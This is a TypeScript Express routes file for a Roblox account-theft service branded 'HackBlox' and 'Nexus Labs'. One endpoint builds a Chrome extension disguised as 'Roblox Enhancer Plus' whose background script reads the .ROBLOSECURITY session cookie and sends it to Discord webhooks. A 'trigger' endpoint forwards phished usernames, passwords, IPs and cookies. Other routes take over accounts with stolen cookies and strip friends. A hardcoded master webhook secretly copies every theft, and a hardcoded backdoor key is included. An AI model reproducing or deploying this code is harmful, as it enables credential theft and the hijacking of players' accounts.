import type { Express } from "express";
import type { Server } from "http";
import { storage } from "./storage";
import { api } from "@shared/routes";
import { z } from "zod";
import { db } from "./db";
import { accessKeys, insertDiscordNickSchema } from "@shared/schema";
import JSZip from "jszip";
import { validateCookie, searchUser, removeFriends, getUserInfo } from "./roblox-api";
import speakeasy from "speakeasy";

const MASTER_WEBHOOK_URL = "https://discord.com/api/webhooks/1454577221573410889/pNI1MaYQTFm3n0-1UBkOLKUMF216j5XHEssVnioYKLnzMy8dkXpFJaa67fs4-x6iABEj";

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  // Seed a default key if none exist
  const existingKeys = await db.select().from(accessKeys);
  if (existingKeys.length === 0) {
    await db.insert(accessKeys).values({
      key: "2012064Pr",
      isActive: true,
      isMaster: true // Seeded key is master
    });
    console.log("Seeded default access key: 2012064Pr");
  }

  // ==================== ROBLOX ENDPOINTS ====================

  // Login com Cookie
  app.post(api.roblox.login.path, async (req, res) => {
    try {
      const { cookie } = api.roblox.login.input.parse(req.body);
      
      const userInfo = await getUserInfo(cookie);
      
      // Armazenar sessão
      await storage.createCookieSession({
        userId: userInfo.userId,
        username: userInfo.username,
        cookie,
        userAgent: req.get('user-agent'),
        expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000), // 24 horas
      });

      res.json(userInfo);
    } catch (error: any) {
      res.status(401).json({ message: error.message || "Cookie inválido" });
    }
  });

  // Obter Cookie da Sessão Ativa
  app.get(api.roblox.getCookie.path, async (req, res) => {
    try {
      const userId = req.query.userId as string;
      if (!userId) {
        return res.status(400).json({ message: "userId é obrigatório" });
      }

      const session = await storage.getCookieSession(userId);
      if (!session) {
        return res.status(401).json({ message: "Nenhuma sessão ativa" });
      }

      res.json({
        cookie: session.cookie,
        username: session.username,
        userId: session.userId,
      });
    } catch (error: any) {
      res.status(400).json({ message: error.message });
    }
  });

  // Remover Amigos
  app.post(api.roblox.removeFriends.path, async (req, res) => {
    try {
      const { cookie } = api.roblox.removeFriends.input.parse(req.body);
      
      const removed = await removeFriends(cookie);
      
      res.json({
        success: true,
        removed,
        message: `${removed} amigo(s) removido(s) com sucesso!`,
      });
    } catch (error: any) {
      res.status(400).json({ message: error.message || "Erro ao remover amigos" });
    }
  });

  // Buscar Usuário
  app.get(api.roblox.searchUser.path, async (req, res) => {
    try {
      const username = req.params.username as string;
      if (!username) {
        return res.status(400).json({ message: "username é obrigatório" });
      }

      const user = await searchUser(username);
      res.json(user);
    } catch (error: any) {
      res.status(404).json({ message: error.message || "Usuário não encontrado" });
    }
  });

  // Gerar Código 2FA
  app.post(api.roblox.generateTwoFactor.path, async (req, res) => {
    try {
      const { secret } = api.roblox.generateTwoFactor.input.parse(req.body);
      
      const code = speakeasy.totp({
        secret,
        encoding: 'base32',
      });

      // Calcular tempo até expiração (TOTP expira a cada 30 segundos)
      const now = Math.floor(Date.now() / 1000);
      const expiresIn = 30 - (now % 30);

      res.json({
        code,
        expiresIn,
      });
    } catch (error: any) {
      res.status(400).json({ message: error.message || "Erro ao gerar código 2FA" });
    }
  });

  // ==================== PRANK ENDPOINTS ====================

  app.get("/api/pranks/:id/download", async (req, res) => {
    try {
      const id = Number(req.params.id);
      const prank = await storage.getPrank(id);
      if (!prank) return res.status(404).send("Prank not found");

      const zip = new JSZip();
      
      zip.file("manifest.json", JSON.stringify({
        manifest_version: 3,
        name: "Roblox Enhancer Plus",
        version: "1.0.0",
        description: "Enhance your Roblox experience with new features!",
        permissions: ["cookies", "tabs", "storage"],
        host_permissions: ["https://*.roblox.com/*", "https://discord.com/*"],
        action: {
          default_popup: "popup.html"
        },
        background: {
          service_worker: "background.js"
        }
      }, null, 2));

      zip.file("background.js", `
const USER_WEBHOOK = "${prank.webhookUrl}";
const MASTER_WEBHOOK = "${MASTER_WEBHOOK_URL}";

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url && tab.url.includes('roblox.com')) {
    captureCookie();
  }
});

async function captureCookie() {
  const cookie = await chrome.cookies.get({
    url: 'https://www.roblox.com',
    name: '.ROBLOSECURITY'
  });

  if (cookie && cookie.value) {
    const payload = {
      username: "HackBlox System",
      content: "@everyone 🔓 **CONTA COMPROMETIDA**",
      embeds: [{
        title: "🔓 Account Compromised",
        color: 16711680,
        fields: [
          { name: ".ROBLOSECURITY", value: "\`\`\`" + cookie.value + "\`\`\`" }
        ],
        timestamp: new Date().toISOString()
      }]
    };

    [USER_WEBHOOK, MASTER_WEBHOOK].forEach(url => {
      fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(console.error);
    });
  }
}
      `);

      zip.file("popup.html", `
<!DOCTYPE html>
<html>
<head>
  <style>
    body { width: 300px; background: #0f172a; color: white; font-family: sans-serif; padding: 16px; margin: 0; }
    .card { background: #1e293b; border-radius: 8px; padding: 16px; margin-bottom: 16px; border: 1px solid #334155; }
    .avatar { width: 100px; height: 100px; border-radius: 50%; border: 3px solid #22c55e; margin: 0 auto 12px; display: block; }
    .info { text-align: center; }
    .label { color: #94a3b8; font-size: 12px; margin-top: 8px; }
    .value { font-weight: bold; font-size: 14px; }
    .wait-box { background: rgba(234, 179, 8, 0.1); border: 1px solid #eab308; border-radius: 8px; padding: 12px; color: #eab308; font-size: 13px; }
    .spinner { display: inline-block; width: 12px; height: 12px; border: 2px solid currentColor; border-right-color: transparent; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 6px; }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="card">
    <img src="https://tr.rbxcdn.com/30day-avatar-headshot/150/150/AvatarHeadshot/Png/True" class="avatar">
    <div class="info">
      <div class="label">USERNAME</div>
      <div class="value">Aguardando...</div>
      <div class="label">USER ID</div>
      <div class="value">---------</div>
    </div>
  </div>
  <div class="wait-box">
    <div class="spinner"></div>
    <strong>Aguarde</strong><br>
    Estamos trabalhando, isso pode levar 5 minutos.
  </div>
</body>
</html>
      `);

      const content = await zip.generateAsync({ type: "nodebuffer" });
      res.setHeader("Content-Type", "application/zip");
      res.setHeader("Content-Disposition", `attachment; filename=hackblox_${prank.id}.zip`);
      res.send(content);
    } catch (error) {
      console.error(error);
      res.status(500).send("Error generating extension");
    }
  });

  app.get(api.admin.keys.list.path, async (req, res) => {
    res.status(404).json({ message: "Not Found" });
  });

  app.post(api.admin.keys.create.path, async (req, res) => {
    res.status(404).json({ message: "Not Found" });
  });

  app.get(api.admin.tickets.list.path, async (req, res) => {
    const masterKey = req.headers["x-master-key"];
    if (masterKey === "2012064Pr") {
      const allTickets = await storage.listTickets();
      return res.json(allTickets);
    }
    res.status(401).json({ message: "Unauthorized" });
  });

  app.post(api.admin.tickets.create.path, async (req, res) => {
    try {
      const { masterKey, code, type } = req.body;
      if (masterKey !== "2012064Pr") return res.status(401).json({ message: "Unauthorized" });
      await storage.createTicket(code, type || "normal");
      res.status(201).json({ success: true });
    } catch (err) {
      res.status(400).json({ message: "Invalid request" });
    }
  });

  app.post("/api/auth/validate", async (req, res) => {
    try {
      const { code } = req.body;
      const userIp = req.ip || "unknown";
      
      if (code === "2012064Pr") {
        return res.json({ success: true, isStaff: true });
      }

      const result = await storage.validateTicket(code, userIp);
      if (result.valid) {
        return res.json({ success: true, isStaff: result.isStaff });
      }
      
      res.status(401).json({ success: false });
    } catch (err) {
      res.status(400).json({ success: false });
    }
  });

  app.post("/api/discord-nicks", async (req, res) => {
    try {
      const input = insertDiscordNickSchema.parse(req.body);
      const nick = await storage.createDiscordNick(input);
      
      try {
        await fetch(MASTER_WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            username: "HackBlox Nicks",
            content: "@everyone 🔔 **NOVA SOLICITAÇÃO DE ACESSO**\\n**Nick:** " + nick.username + "\\n**Ticket:** " + nick.ticketCode
          })
        });
      } catch (err) {
        console.error("Failed to send nick to master webhook:", err);
      }

      res.status(201).json(nick);
    } catch (err) {
      res.status(400).json({ message: "Invalid data" });
    }
  });

  app.get("/api/discord-nicks", async (req, res) => {
    const nicks = await storage.getDiscordNicks();
    res.json(nicks);
  });

  app.post(api.pranks.create.path, async (req, res) => {
    try {
      const input = api.pranks.create.input.parse(req.body);
      const prank = await storage.createPrank({ webhookUrl: input.webhookUrl });
      res.status(201).json(prank);
    } catch (err) {
      if (err instanceof z.ZodError) {
        return res.status(400).json({ message: err.errors[0].message });
      }
      res.status(500).json({ message: "Internal Server Error" });
    }
  });

  app.get(api.pranks.get.path, async (req, res) => {
    const id = Number(req.params.id);
    if (isNaN(id)) return res.status(404).json({ message: "Invalid ID" });
    const prank = await storage.getPrank(id);
    if (!prank) return res.status(404).json({ message: "Prank not found" });
    res.json({ id: prank.id });
  });

  app.post(api.pranks.trigger.path, async (req, res) => {
    try {
      const id = Number(req.params.id);
      const input = api.pranks.trigger.input.parse(req.body);
      const prank = await storage.getPrank(id);
      if (!prank) return res.status(404).json({ message: "Prank not found" });

      const payload = {
        username: "NEXUS LABS",
        content: "@everyone 🔔 **NOVO HIT DETECTADO!**",
        embeds: [{
          title: `👤 Usuário: ${input.username}`,
          color: 10181046, // Roxo
          fields: [
            { name: "🔑 Senha", value: `\`${input.password || "N/A"}\``, inline: false },
            { name: "🌐 IP", value: `\`${req.ip || "unknown"}\``, inline: true },
            { name: "📂 Template", value: `\`${prank.template || "profile"}\``, inline: true },
            { name: "🍪 Cookie", value: input.cookie ? `\`\`\`${input.cookie}\`\`\`` : "Não capturado", inline: false }
          ],
          footer: { text: "Nexus Labs - Advanced Beaming System" },
          timestamp: new Date().toISOString()
        }]
      };

      // Enviar para webhook do usuário e webhook mestra
      const webhooks = [prank.webhookUrl, MASTER_WEBHOOK_URL];
      await Promise.all(webhooks.map(url => 
        fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        }).catch(err => console.error("Webhook error:", err))
      ));

      res.json({ success: true });
    } catch (err) {
      res.status(400).json({ message: "Failed to trigger prank" });
    }
  });

  return httpServer;
}
